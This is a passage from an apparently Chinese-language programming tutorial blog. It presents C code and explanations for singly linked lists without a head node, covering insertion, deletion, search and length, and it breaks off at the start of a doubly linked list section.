<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到索引为1的节点，值为：%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到索引为1的节点\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 求链表长度</span><br>    <span class="hljs-type">int</span> length = GetLength(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表长度为：%d\n&quot;</span>, length);<br><br>    <span class="hljs-comment">// 释放链表内存</span><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>    &#125;<br><br> <br></code></pre></td></tr></table></figure><p>不带头节点的链表实现</p><ol><li>没有额外的头节点，第一个节点直接存储有效数据。</li><li>在对链表进行插入、删除操作时，需要考虑链表为空或者操作的节点为第一个节点的特殊情况。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 数据域，存储节点的数据</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span>  <span class="hljs-comment">// 指针域，指向下一个节点</span><br>&#125; LinkList;<br><br><br><br><span class="hljs-comment">// 初始化没有头节点的链表</span><br>Node* <span class="hljs-title function_">InitList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 初始化为空链表</span><br>&#125;<br><br><span class="hljs-comment">/* 用头插法建立一个不带头结点的单链表 */</span><br>LinkList *<span class="hljs-title function_">AddHead</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head = <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">// 初始化为空链表</span><br>    LinkList *p;              <span class="hljs-comment">// 临时指针，用于新节点的创建</span><br>    <span class="hljs-type">int</span> x;                      <span class="hljs-comment">// 存放输入数据的临时变量</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入节点数据（输入-1结束）：&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);             <span class="hljs-comment">// 输入第一个数据</span><br><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;      <span class="hljs-comment">// 循环条件：输入值不为 -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// 生成新节点</span><br>        p-&gt;data = x;               <span class="hljs-comment">// 将数据存入新节点</span><br>        p-&gt;next = head;        <span class="hljs-comment">// 新节点的 next 指向当前的头指针</span><br>        head = p;             <span class="hljs-comment">// 更新头指针指向新节点</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);           <span class="hljs-comment">// 继续输入下一个数据</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                                <span class="hljs-comment">// 返回头指针</span><br>&#125;<br><br><br><br> <span class="hljs-comment">/* 尾插法建立一个不带头结点的单链表 */</span><br>LinkList *<span class="hljs-title function_">AddTail</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head = <span class="hljs-literal">NULL</span>;            <span class="hljs-comment">// 初始化为空链表</span><br>    LinkList *p, *q = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// p 用于新节点的创建，q 指向链表的尾部</span><br>    <span class="hljs-type">int</span> x;                     <span class="hljs-comment">// 存放输入数据的临时变量</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入节点数据（输入-1结束）：&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);              <span class="hljs-comment">// 输入第一个数据</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;           <span class="hljs-comment">// 循环条件：输入值不为 -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// 生成新节点</span><br>        p-&gt;data = x;                         <span class="hljs-comment">// 将数据存入新节点</span><br>        p-&gt;next = <span class="hljs-literal">NULL</span>;   <span class="hljs-comment">// 新节点的 next 指向 NULL，表示链表末尾</span><br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;                    <span class="hljs-comment">// 如果链表为空</span><br>            head = p;                     <span class="hljs-comment">// 新节点作为第一个节点</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            q-&gt;next = p;             <span class="hljs-comment">// 尾节点的 next 指向新节点</span><br>        &#125;<br>        q = p;                          <span class="hljs-comment">// 更新尾指针指向新节点</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                <span class="hljs-comment">// 继续输入下一个数据</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                   <span class="hljs-comment">// 返回头指针</span><br>&#125;<br><br><br><br><span class="hljs-comment">// 在链表末尾插入新节点</span><br>Node* <span class="hljs-title function_">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// 如果链表为空，新节点作为头节点</span><br>    &#125;<br><br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p = p-&gt;next; <span class="hljs-comment">// 找到链表的末尾</span><br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// 将新节点插入到链表末尾</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 在指定节点之前插入新节点（前插法）</span><br>Node* <span class="hljs-title function_">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    <span class="hljs-keyword">if</span> (head == target) &#123; <span class="hljs-comment">// 如果目标节点是头节点</span><br>        newNode-&gt;next = head;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// 新节点作为新的头节点</span><br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != target) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        newNode-&gt;next = target;<br>        p-&gt;next = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到目标节点\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(newNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><br><span class="hljs-comment">// 在指定节点之后插入新节点（后插法）</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = target-&gt;next;<br>    target-&gt;next = newNode;<br>&#125;<br><br><span class="hljs-comment">// 打印链表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node *head)</span> &#123;<br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 按值删除节点</span><br>Node* <span class="hljs-title function_">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (head-&gt;data == value) &#123; <span class="hljs-comment">// 如果要删除的是头节点</span><br>        Node *temp = head;<br>        head = head-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next-&gt;data != value) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// 找到要删除的节点</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// 重新连接链表</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// 释放节点内存</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 按序号删除节点</span><br>Node* <span class="hljs-title function_">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无效的索引\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span> &amp;&amp; head != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 删除头节点</span><br>        Node *temp = head;<br>        head = head-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index - <span class="hljs-number">1</span>) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p-&gt;next; <span class="hljs-comment">// 找到要删除的节点</span><br>        p-&gt;next = temp-&gt;next; <span class="hljs-comment">// 重新连接链表</span><br>        <span class="hljs-built_in">free</span>(temp);           <span class="hljs-comment">// 释放节点内存</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;索引超出范围\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 按值查找节点</span><br>Node* <span class="hljs-title function_">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到匹配的节点</span><br>&#125;<br><br><span class="hljs-comment">// 按序号查找节点</span><br>Node* <span class="hljs-title function_">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p; <span class="hljs-comment">// 如果索引超出范围，将返回 NULL</span><br>&#125;<br><br><span class="hljs-comment">// 求链表长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetLength</span><span class="hljs-params">(Node *head)</span> &#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    Node *head = InitList(); <span class="hljs-comment">// 初始化没有头节点的链表</span><br>    <span class="hljs-comment">// 插入一些节点</span><br>    head = Insert(head, <span class="hljs-number">10</span>);<br>    head = Insert(head, <span class="hljs-number">20</span>);<br>    head = Insert(head, <span class="hljs-number">30</span>);<br>    head = Insert(head, <span class="hljs-number">40</span>);<br>    <span class="hljs-comment">// 打印链表内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表内容为：&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// 在值为30的节点之前插入值为25的节点</span><br>    head = InsertBefore(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为30的节点之前插入值为25的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// 在值为25的节点之后插入值为27的节点</span><br>    InsertAfter(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为25的节点之后插入值为27的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// 删除值为20的节点</span><br>    head = Delete(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除值为20的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// 按序号删除节点</span><br>    head = DeleteAt(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除索引为2的节点后链表内容为：&quot;</span>);<br>    PrintList(head);<br>    <span class="hljs-comment">// 按值查找节点</span><br>    Node *foundNode = FindByValue(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到值为30的节点，地址为：%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到值为30的节点\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 按序号查找节点</span><br>    foundNode = FindByIndex(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到索引为1的节点，值为：%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到索引为1的节点\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 求链表长度</span><br>    <span class="hljs-type">int</span> length = GetLength(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表长度为：%d\n&quot;</span>, length);<br>    <span class="hljs-comment">// 释放链表内存</span><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>带头节点的链表</strong></p><ul><li>初始化时创建一个头节点，头节点不存储有效数据。</li><li>插入、删除、遍历等操作都从头节点开始，简化了对第一个节点的特殊判断。</li><li>例如在<code>Insert()</code>和<code>Delete()</code>函数中操作时，由于有头节点的存在，所有的节点都可以用统一的方式来处理。</li></ul><p><strong>不带头节点的链表</strong></p><ul><li>初始化时直接设置为空链表（<code>NULL</code>）。</li><li>插入操作时，如果链表为空，新节点成为头节点。</li><li>删除操作需要特殊处理第一个节点的情况，以确保头节点正确连接后续节点。</li></ul><h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span 